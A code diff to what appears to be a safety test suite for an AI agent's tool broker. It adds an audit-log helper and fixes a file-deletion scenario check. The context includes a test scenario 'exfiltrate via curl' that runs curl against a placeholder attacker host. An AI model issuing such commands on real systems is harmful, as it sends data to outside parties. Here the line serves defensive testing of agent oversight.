@@ -84,6 +84,13 @@ class World:
         ws = self.workspace()
         return (ws is not None and (ws / name).exists()) or name in self.stored_paths()
 
+    def succeeded_calls(self, tool: str) -> int:
+        """Broker calls of ``tool`` that ran and returned ok, from the audit log."""
+        return int(self.sup.queue._conn.execute(
+            "SELECT COUNT(*) FROM events WHERE kind = 'broker_call' "
+            "AND json_extract(detail, '$.tool') = ? AND json_extract(detail, '$.ok') = 1",
+            (tool,)).fetchone()[0])
+
     def operations(self, tool: str) -> int:
         return int(self.sup.queue._conn.execute(
             "SELECT COUNT(*) FROM operations WHERE tool = ?", (tool,)).fetchone()[0])
@@ -123,7 +130,10 @@ SCENARIOS: tuple[Scenario, ...] = (
     Scenario("delete a file",
              "delete a file the task owns",
              (("fs.delete", {"path": VICTIM}),),
-             lambda w: not w.has_file(VICTIM), approval_required=True),
+             # The file must have been written before its absence means a deletion. A
+             # run that broke before the write would otherwise read as an attack.
+             lambda w: w.succeeded_calls("fs.write") > 0 and not w.has_file(VICTIM),
+             approval_required=True),
     Scenario("run a shell command",
              "exfiltrate via curl",
              (("shell.run", {"argv": ["curl", f"https://{EVIL_HOST}/x"]}),),
